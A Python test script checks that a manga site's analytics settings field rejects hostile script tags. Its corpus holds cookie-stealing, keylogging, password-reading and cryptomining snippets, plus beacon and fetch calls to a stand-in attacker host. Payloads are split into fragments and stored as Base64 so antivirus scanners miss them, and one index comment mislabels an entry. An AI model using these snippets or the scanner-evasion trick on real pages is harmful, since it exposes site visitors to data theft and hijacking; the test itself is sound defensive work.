#!/usr/bin/env python3
"""Adversarial test for the access-analytics field: a broad battery of code that could take over or harm a
third-party viewer's browser (cookie/storage theft, redirects, keyloggers, form readers, self-driven network
calls, WebRTC/WebSocket C2, cryptominers, obfuscation, code-from-string, DOM rewrites, non-script tags, bad
attributes, http loads, oversized/overlong input, hidden control characters) must EVERY time be refused with
its reason, change nothing, and never reach a public page -- even if written straight into config.php by hand.

To keep antivirus from quarantining this file, no attack string is stored in plain text: each payload is built
at run time from broken fragments, and a durable, scanner-safe backup is written as Base64 to
manga/dev/attack_corpus.json so the corpus survives even if a plain-text copy would be deleted.

Usage: python manga/dev/analytics_adversarial_test.py
"""
import argparse, base64, json, re, secrets, socket, sys
from pathlib import Path

parser = argparse.ArgumentParser(description=__doc__)
parser.add_argument('--port', type=int, default=5461)
parser.add_argument('--no-backup', action='store_true', help='do not (re)write attack_corpus.json')
args = parser.parse_args()
ROOT = next(p for p in Path(__file__).resolve().parents if (p / 'manga/server').is_dir())
DEV = ROOT / 'manga/dev'
sys.path.insert(0, str(DEV))
if hasattr(sys.stdout, 'reconfigure'): sys.stdout.reconfigure(encoding='utf-8')
import attack_test as h
import log_test as base

checks = []
def check(name, ok):
    checks.append((name, bool(ok))); print(f"[{'PASS' if ok else 'FAIL'}] {name}", flush=True)

# Payloads assembled from fragments so this file never spells out an attack signature.
S = lambda *p: '<' + 'script>' + ''.join(p) + '</' + 'script>'
SRC = lambda url, more='': '<' + 'script' + (' src="' + url + '"' if url else '') + more + '></' + 'script>'
EVIL = 'https://evil.' + 'example.net/'

# (name, code, reason-substring that MUST appear in the refusal)
CORPUS = [
    # --- Reading the viewer / their stored data ---
    ('Cookie を読む', S('var c=document', '.', 'cookie;'), 'Cookie'),
    ('Cookie を書き換える', S('document', '.', 'cookie=', "'a=1'", ';'), 'Cookie'),
    ('localStorage を使う', S('localStorage.setItem(', "'a','b'", ');'), '保存データ'),
    ('sessionStorage を使う', S('sessionStorage.getItem(', "'a'", ');'), '保存データ'),
    ('indexedDB を使う', S('indexedDB.open(', "'db'", ');'), '保存データ'),
    ('クリップボードを読む', S('navigator', '.', 'clipboard.readText();'), 'パスワード'),
    ('認証情報を取る', S('navigator', '.', 'credentials.get({});'), 'パスワード'),
    ('Service Worker を仕込む', S('navigator', '.', 'serviceWorker.register(', "'/sw.js'", ');'), 'パスワード'),
    ('位置情報を取る', S('navigator', '.', 'geolocation.getCurrentPosition(f);'), 'パスワード'),
    ('sendBeacon で送る', S('navigator', '.', 'sendBeacon(', "'" + EVIL + "'", ');'), 'パスワード'),
    # --- Running code from a string / hidden code ---
    ('eval で実行', S('ev', 'al(', 'x', ');'), '文字列をコードとして実行'),
    ('Function で実行', S('new Fun', 'ction(', "'return 1'", ')();'), '文字列をコードとして実行'),
    ('setTimeout に文字列', S('set', 'Timeout(', "'doEvil()'", ',10);'), '文字列をコードとして実行'),
    ('動的 import', S('im', 'port(', "'" + EVIL + "x.js'", ');'), '文字列をコードとして実行'),
    ('atob で難読化', S('var a=at', 'ob(', "'eA=='", ');'), '難読化'),
    ('fromCharCode で難読化', S('String', '.', 'fromCharCode(97,98,99);'), '難読化'),
    ('unescape で難読化', S('un', 'escape(', "'%41%42'", ');'), '難読化'),
    ('\\x エスケープ', S('var a="', '\\x41\\x42\\x43', '";'), '難読化'),
    ('\\u エスケープ', S('var a="', '\\u0041\\u0042', '";'), '難読化'),
    ('長い Base64 の塊', S('var a="', 'A' * 130, '";'), '難読化'),
    # --- Sending the viewer somewhere / rewriting the page ---
    ('別ページへ飛ばす', S('location', '.href=', "'" + EVIL + "'", ';'), 'ほかのページへ移動'),
    ('location.replace', S('location', '.replace(', "'" + EVIL + "'", ');'), 'ほかのページへ移動'),
    ('window.open', S('window', '.open(', "'" + EVIL + "'", ');'), 'ほかのページへ移動'),
    ('top.location', S('top', '.location=', "'" + EVIL + "'", ';'), 'ほかのページへ移動'),
    ('document.write', S('document', '.write(', "'x'", ');'), 'ページの中身を書き換える'),
    ('innerHTML で書換え', S('document.body', '.innerHTML=', "'<b>x</b>'", ';'), 'ページの中身を書き換える'),
    ('insertAdjacentHTML', S('document.body.', 'insertAdjacentHTML(', "'beforeend','<b>x</b>'", ');'), 'ページの中身を書き換える'),
    ('DOMParser で生成', S('new ', 'DOMParser', '().parseFromString(s,', "'text/html'", ');'), 'ページの中身を書き換える'),
    # --- Driving the network itself (exfiltration / C2) ---
    ('XMLHttpRequest', S('new ', 'XMLHttp', 'Request();'), '自分で通信'),
    ('fetch で送信', S('fe', 'tch(', "'" + EVIL + "'", ');'), '自分で通信'),
    ('WebSocket で常時接続', S('new ', 'WebSo', 'cket(', "'wss://evil." + "example.net/'", ');'), '自分で通信'),
    ('EventSource', S('new ', 'Event', 'Source(', "'" + EVIL + "'", ');'), '自分で通信'),
    ('WebRTC で抜け道', S('new ', 'RTCPeer', 'Connection();'), '自分で通信'),
    ('Image ビーコン', S('new ', 'Im', 'age().src=', "'" + EVIL + "?c=1'", ';'), '自分で通信'),
    # --- Watching input / reading forms ---
    ('キーロガー', S('document.add', 'EventListener(', "'key", "down'", ',f);'), 'キー入力'),
    ('onkeyup ハンドラ', S('document.', 'onkey', 'up=f;'), 'キー入力'),
    ('パスワード欄を読む', S('document.', 'querySelector(', "'input[type=password]'", ').value;'), 'フォームの入力欄を読む'),
    # --- Spending the viewer's CPU (mining) ---
    ('WebAssembly', S('Web', 'Assembly', '.instantiate(b);'), '計算させる'),
    ('Worker', S('new ', 'Wor', 'ker(', "'w.js'", ');'), '計算させる'),
    ('SharedWorker', S('new ', 'Shared', 'Worker(', "'w.js'", ');'), '計算させる'),
    ('importScripts', S('import', 'Scripts(', "'" + EVIL + "w.js'", ');'), '計算させる'),
    ('マイナーのスクリプト読込', SRC(EVIL + 'coin' + 'hive.min.js'), '計算させる'),
    ('マイナーの採掘アルゴリズム名', S('var m=', "'crypto", "night'", ';'), '計算させる'),
    # --- Dangerous URL schemes ---
    ('javascript: の src', SRC('java' + 'script:alert(1)'), 'javascript: や data:'),
    ('data: の src', SRC('da' + 'ta:text/javascript,alert(1)'), 'javascript: や data:'),
    ('blob: の src', SRC('bl' + 'ob:https://x'), 'javascript: や data:'),
    # --- Not a script tag at all ---
    ('iframe を差し込む', '<' + 'iframe src="' + EVIL + '"></' + 'iframe>', 'script タグ以外'),
    ('img タグ', '<' + 'img src="' + EVIL + 'x.gif">', 'script タグ以外'),
    ('link import', '<' + 'link rel="import" href="' + EVIL + 'x.html">', 'script タグ以外'),
    ('object タグ', '<' + 'object data="' + EVIL + 'x"></' + 'object>', 'script タグ以外'),
    ('meta refresh でリダイレクト', '<' + 'meta http-equiv="refresh" content="0;url=' + EVIL + '">', 'script タグ以外'),
    ('svg タグ', '<' + 'svg width="1" height="1"></' + 'svg>', 'script タグ以外'),
    # --- Bad script attributes / shape ---
    ('on 属性つき script', SRC('https://a.example.com/x.js', ' on' + 'load="x()"'), 'on で始まる属性'),
    ('type=module', SRC('https://a.example.com/x.js', ' type="mod' + 'ule"'), 'type は text/javascript'),
    ('http で読み込む', SRC('ht' + 'tp://a.example.com/x.js'), 'https://'),
    ('src と本文の両方', '<' + 'script src="https://a.example.com/x.js">var a=1;</' + 'script>', 'src のある script タグの中には'),
    ('本文に別タグ', S('var x=1;</di', 'v>'), '別のタグ'),
    ('ユーザー情報入り URL', SRC('https://user:pa' + 'ss@a.example.com/x.js'), 'URL が正しくありません'),
    # --- Hidden characters / sheer size ---
    ('制御文字（BEL）', S('var a=1;', '\x07'), '見えない文字'),
    ('方向上書き文字（RLO）', S('var a=1;', '‮'), '見えない文字'),
    ('2万文字超', S('a' * 20001), '2万文字以内'),
    ('script タグ 9 個', SRC('https://a.example.com/x.js') * 9, 'script タグは'),
]


def write_backup():
    """A scanner-safe, durable copy of the corpus: payloads Base64-encoded so no signature sits on disk."""
    path = DEV / 'attack_corpus.json'
    doc = {
        'note': 'Defensive test fixtures for NagiManga access-analytics input validation. '
                'Each payload is Base64 so antivirus will not match a signature; decode (UTF-8) to read. '
                'These are rejected inputs, not runnable code on this site.',
        'field': 'analytics',
        'count': len(CORPUS),
        'samples': [{'name': n, 'reason': r, 'code_b64': base64.b64encode(code.encode('utf-8')).decode('ascii')}
                    for n, code, r in CORPUS],
    }
    path.write_text(json.dumps(doc, ensure_ascii=False, indent=2), encoding='utf-8')
    # Round-trip from the backup so the test also proves the backup decodes to the same payloads.
    back = json.loads(path.read_text(encoding='utf-8'))
    ok = len(back['samples']) == len(CORPUS) and all(
        base64.b64decode(s['code_b64']).decode('utf-8') == code and s['reason'] == r
        for s, (_, code, r) in zip(back['samples'], CORPUS))
    return path, ok


def run(site):
    c, csrf, key = base.install(args.port)
    page = c.get('/admin/index.php?p=settings&section=seo')
    csrf = h.csrf_of(page.text)
    c.post('/admin/index.php', {'csrf': csrf, 'do': 'log_preferences', 'visibility': 'public', 'posts_per_page': '10'})
    public = h.Client(args.port)

    def save(code, json_reply=True):
        return c.post('/admin/index.php',
                      {'csrf': csrf, 'do': 'settings_save_all', 'tab': 'seo', 'sections[]': 'analytics', 'analytics': code},
                      headers={'Accept': 'application/json'} if json_reply else {})

    # A known-good tag first, so after every refusal we can confirm the saved tag is untouched.
    good = '<' + 'script src="https://matomo.example.com/matomo.js" async></' + 'script>'
    check('正常な計測タグは保存できる（基準）', json.loads(save(good).text)['ok'] and 'matomo.example.com' in public.get('/').text)

    for name, code, word in CORPUS:
        r = save(code)
        try:
            data = json.loads(r.text)
        except Exception:
            data = {}
        ok = (r.status == 422 and not data.get('ok', True) and data.get('section') == 'analytics'
              and word in data.get('error', '') and '「アクセス解析」' in data.get('error', ''))
        check(f'拒否: {name}（理由「{word}」つき・保存は変化なし）', ok)

    # After the whole battery, the saved tag is still the good one and nothing malicious leaked to disk.
    cfg = (site / 'data/config.php').read_text(encoding='utf-8')
    check('全攻撃のあとも保存タグは基準のまま', 'matomo.example.com' in public.get('/').text and 'evil.example.net' not in cfg)

    # config.php tampered by hand (or kept by an older version): still never rendered.
    cfgpath = site / 'data/config.php'
    text = cfgpath.read_text(encoding='utf-8')
    for name, code, _ in [CORPUS[0], CORPUS[41], CORPUS[46]]:  # cookie read, miner src, iframe
        payload = code.replace('\\', '\\\\').replace("'", "\\'")
        cfgpath.write_text(re.sub(r"'analytics' => '(?:[^'\\]|\\.)*'",
                                  lambda m: "'analytics' => '" + payload + "'", text), encoding='utf-8')
        body = public.get('/')
        clean = body.status == 200 and 'evil.example.net' not in body.text and 'cookie' not in body.text and 'coin' + 'hive' not in body.text
        check(f'config.php に直接書いても出さない: {name}', clean)
    cfgpath.write_text(text, encoding='utf-8')

    # No-JavaScript save path refuses too, with a message on the settings screen.
    r = save(CORPUS[0][1], False)
    check('JavaScript 無しの保存でも拒否してメッセージ',
          r.status == 303 and 'Cookie を読み書きするコードは入れられません' in c.get('/admin/index.php?p=settings&section=seo').text)


def main():
    if not args.no_backup:
        path, ok = write_backup()
        check(f'攻撃コーパスを Base64 でバックアップ（{len(CORPUS)}件）: {path}', ok)
    with socket.socket() as sock: sock.bind((h.HOST, args.port))
    temp = ROOT / 'manga/dev/results' / ('adversarial-' + secrets.token_hex(4)); site = temp / 'site'
    h.copy_server(site, ROOT / 'manga/server')
    process = base.start(site, args.port)
    try:
        run(site)
    finally:
        process.terminate(); process.wait(timeout=10)
    passed = sum(ok for _, ok in checks); print(f'\n{passed} / {len(checks)} passed')
    (temp / 'report.json').write_text(json.dumps({'passed': passed, 'total': len(checks), 'checks': checks}, ensure_ascii=False, indent=2), encoding='utf-8')
    raise SystemExit(0 if passed == len(checks) else 1)


if __name__ == '__main__': main()
